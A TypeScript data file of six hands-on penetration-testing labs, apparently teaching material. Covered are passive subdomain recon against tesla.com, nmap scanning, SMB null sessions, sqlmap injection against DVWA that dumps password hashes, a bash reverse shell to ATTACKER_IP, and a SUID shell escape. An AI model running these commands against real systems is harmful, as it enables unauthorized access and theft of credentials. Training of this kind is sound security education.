export type Lab = {
  slug: string;
  title: string;
  category: "Beginner" | "Intermediate" | "Advanced" | "Real World";
  minutes: number;
  objective: string;
  requirements: string[];
  steps: { instruction: string; command?: string; expected?: string }[];
  aiPrompts: string[];
  solutionSummary: string;
};

export const labs: Lab[] = [
  {
    slug: "recon-subdomain-hunt",
    title: "Subdomain Hunt with Passive OSINT",
    category: "Beginner",
    minutes: 20,
    objective: "Build a subdomain list for tesla.com using only passive sources.",
    requirements: ["Internet access", "subfinder OR just crt.sh via curl"],
    steps: [
      { instruction: "Query certificate transparency logs.", command: "curl -s 'https://crt.sh/?q=%25.tesla.com&output=json' | jq -r '.[].name_value' | sort -u | head -30" },
      { instruction: "Compare with subfinder output.", command: "subfinder -d tesla.com -silent | head -30" },
      { instruction: "Combine both results and unique-sort.", command: "cat crt.txt sub.txt | sort -u > all.txt; wc -l all.txt" },
      { instruction: "Identify the 3 most 'interesting' subdomains (staging, admin, dev...)." },
    ],
    aiPrompts: [
      "Explain why certificate transparency reveals subdomains.",
      "What are the top 5 most valuable subdomain prefixes to investigate?",
    ],
    solutionSummary: "Between crt.sh and subfinder you'll typically get 300+ unique subdomains. Prioritize prefixes like admin-, dev-, staging-, old-, jenkins-.",
  },
  {
    slug: "nmap-full-scan",
    title: "Full Nmap Scan of a Lab Host",
    category: "Beginner",
    minutes: 25,
    objective: "Map every open port and service on scanme.nmap.org (authorized target).",
    requirements: ["nmap installed", "Root/sudo"],
    steps: [
      { instruction: "Discovery.", command: "sudo nmap -sn scanme.nmap.org" },
      { instruction: "Top 1000 TCP.", command: "sudo nmap --top-ports 1000 -T4 scanme.nmap.org" },
      { instruction: "Full 65535 TCP SYN scan.", command: "sudo nmap -sS -p- -T4 -oA scanme scanme.nmap.org" },
      { instruction: "Version + safe scripts on found ports.", command: "sudo nmap -sV -sC -p <ports> scanme.nmap.org" },
    ],
    aiPrompts: [
      "Explain the difference between top-ports and -p-.",
      "What did the -sC scripts tell me?",
    ],
    solutionSummary: "You should identify at least SSH on 22 and HTTP on 80, plus running versions.",
  },
  {
    slug: "smb-enum-null",
    title: "SMB Null Session Enumeration",
    category: "Intermediate",
    minutes: 30,
    objective: "Enumerate a legacy SMB server with an anonymous null session.",
    requirements: ["enum4linux", "smbclient", "Local lab Samba VM"],
    steps: [
      { instruction: "List shares anonymously.", command: "smbclient -L //10.0.0.5 -N" },
      { instruction: "Full enum.", command: "enum4linux -a 10.0.0.5" },
      { instruction: "Try to browse an interesting share.", command: "smbclient //10.0.0.5/Backups -N" },
      { instruction: "Download a file for offline analysis.", command: "smb: \\> get sql.bak" },
    ],
    aiPrompts: ["Why do null sessions still exist?", "How would a defender detect enum4linux traffic?"],
    solutionSummary: "You'll get user lists, share names, and (on older Samba) domain info without any credentials.",
  },
  {
    slug: "dvwa-sqli-low",
    title: "SQL Injection on DVWA (Low)",
    category: "Intermediate",
    minutes: 25,
    objective: "Prove SQL injection on the DVWA sqli-low endpoint and dump users.",
    requirements: ["Local DVWA install", "Burp Suite CE", "sqlmap"],
    steps: [
      { instruction: "Set DVWA security to Low, open the SQL Injection lab." },
      { instruction: "Try `1' OR '1'='1` in the ID field — observe row count." },
      { instruction: "Capture the request with Burp; save as dvwa.req." },
      { instruction: "Run sqlmap.", command: "sqlmap -r dvwa.req --batch --dbs" },
      { instruction: "Dump the users table.", command: "sqlmap -r dvwa.req -D dvwa -T users --dump" },
    ],
    aiPrompts: ["Explain UNION-based SQLi in one paragraph.", "How would a prepared statement prevent this?"],
    solutionSummary: "You'll extract admin, gordonb, 1337, pablo, smithy hashes from dvwa.users.",
  },
  {
    slug: "reverse-shell-101",
    title: "Reverse Shell 101",
    category: "Intermediate",
    minutes: 20,
    objective: "Catch a bash reverse shell and upgrade it to a full PTY.",
    requirements: ["Two local VMs (attacker + target)", "netcat"],
    steps: [
      { instruction: "On attacker, start listener.", command: "nc -lvnp 4444" },
      { instruction: "On target, execute reverse shell.", command: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" },
      { instruction: "In the shell, upgrade to a PTY.", command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
      { instruction: "Set terminal settings.", command: "export TERM=xterm; stty rows 40 cols 120" },
    ],
    aiPrompts: ["Why does a bare shell not support Ctrl-C properly?", "Explain how /dev/tcp works in bash."],
    solutionSummary: "You end with a fully interactive shell you can use like SSH.",
  },
  {
    slug: "linux-privesc-suid",
    title: "Linux Priv-Esc via SUID Binary",
    category: "Advanced",
    minutes: 30,
    objective: "Escalate from a low-privilege user to root via a misconfigured SUID binary.",
    requirements: ["TryHackMe 'Kenobi' or local lab", "GTFOBins access"],
    steps: [
      { instruction: "Enumerate SUID binaries.", command: "find / -perm -4000 2>/dev/null" },
      { instruction: "Identify an unusual entry (e.g. /usr/bin/menu or /usr/bin/find with SUID bit)." },
      { instruction: "Consult GTFOBins for the abuse technique." },
      { instruction: "Execute the technique.", command: "sudo find . -exec /bin/sh \\; -quit" },
      { instruction: "Confirm root.", command: "id" },
    ],
    aiPrompts: ["Explain the SUID bit in three sentences.", "How should this binary have been configured?"],
    solutionSummary: "uid=0(root). Priv-esc via SUID find abuse.",
  },
];
